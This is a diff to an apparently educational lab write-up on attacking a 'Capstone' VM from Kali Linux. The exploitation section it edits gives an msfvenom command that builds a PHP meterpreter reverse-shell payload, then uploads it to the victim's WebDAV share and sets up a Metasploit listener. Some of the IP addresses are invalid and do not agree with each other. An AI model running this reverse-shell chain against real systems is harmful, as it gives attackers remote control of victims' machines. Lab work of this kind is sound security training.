@@ -172,11 +172,13 @@ c) **Exploitation**
 
 - Now that I have acess to file sharing at Capsone VM through my Kali VM, I can hack Capstone by running a malacious script (if you may).  
 
-- To do this, on my Kali Vm I will use `msfvenom` to create a reverse shell payload script in Kali Linux (hacker's VM)
+- To do this, on my Kali Vm I can use `msfvenom` to create a reverse shell payload script in Kali Linux (hacker's VM). This payload when run on the victim machine (capstone VM) can extablish a retrograde connection with Kali linux on the Hacker's machine (Kali VM) and open up session and a terminal to execute additional code. This is where the Exploitation phase ends and the post-exploitation starts. 
 
-- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1.90 LPORT=666 -f raw > shell.php`
+- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1.8 LPORT=666 -f raw > shell.php`
 
-- Once shell.php is generated then you can copy it into `dav://192.168.1.105/webdav/` from the browser - this can be done from Kali Linux. In other words you will be 
+![](images-red/msfvenom.png)
+
+- Once shell.php is generated then you can copy it into `dav://192.168.1.105/webdav/` from the browser - this can be done from Kali Linux as you are now already connected to the victim's machine 
 
 - Now in Kali Linux run **Metasploit** and run the following commands to prepare for listening and retrograde connection of the  Capstone VM(victim) with Kali Linux. Run the following commands:
 
@@ -184,6 +186,7 @@ c) **Exploitation**
 - `set payload php/meterpreter/reverse_tcp`
 - `set lhost 192.168.1.90`
 - `set lport 666`
+- `show options`
 - `run`
 
 
